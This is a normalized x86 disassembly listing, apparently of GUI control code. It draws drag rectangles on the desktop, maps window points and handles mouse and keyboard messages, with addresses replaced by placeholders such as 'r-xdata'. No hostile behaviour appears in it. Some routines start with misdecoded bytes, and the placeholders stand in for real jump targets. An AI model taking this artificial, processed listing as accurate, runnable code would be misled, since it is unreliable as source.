mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44147b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_4236b8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441482
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4414b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4403e8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403418
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403418
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403418
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403418
jmp r-xdata
sub_4415a4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418d40
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_441a8c
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_440834
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_440848
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_418d90
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441784
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4403bc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403418
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4470c4
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dfb8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44176f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4470c4
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4470c4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_440244
test esi esi
je r-xdata
sub_441784
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403418
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_442608
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403418
mov eax esi
call sub_4402ec
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4402a8
mov ecx eax
xor edx edx
xor eax eax
call sub_418d68
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403418
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_441828
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_441858
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4418c4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_441984
sub_4418f4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_441924
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4403e8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441950
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_441984
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_441a58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_441a8c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_441b24
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4576d8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4576d8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_440444
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_460f2c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403418
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45761c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403418
jmp r-xdata
sub_441cb8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408a9c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408ac8
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_440444
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4088f4
call sub_408890
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408890
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_441d60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_441d90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_441d54
push ebp
call sub_441d60
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441de0
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_441e6c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_441ea4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_441924
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45758c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403418
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45758c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403418
sub_441f28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_440414
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_440adc
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_441ea4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_441f74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_440414
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_441f90
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_440414
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_440adc
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441ea4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403418
sub_441fe8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4418c4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_441858
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4418c4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_442084
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_441ea4
pop esi
pop ebx
retn
sub_4420a9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_441ea4
pop esi
pop ebx
retn
sub_4420cf
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_441ea4
pop esi
pop ebx
retn
sub_4420f9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_441ea4
pop esi
pop ebx
retn
sub_442124
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_442154
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_441924
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45758c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403418
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45758c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403418
sub_4421cc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_442204
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45758c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403418
sub_44223c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_440adc
mov edx edi
xor ecx ecx
mov eax ebx
call sub_442204
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cd4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403418
sub_4422b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_442204
pop esi
pop ebx
retn
sub_4422d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_442204
pop esi
pop ebx
retn
sub_4422f4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45758c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403418
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44ba1c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44234c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_440acc
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_440adc
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_441a58
pop esi
retn
sub_44238c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
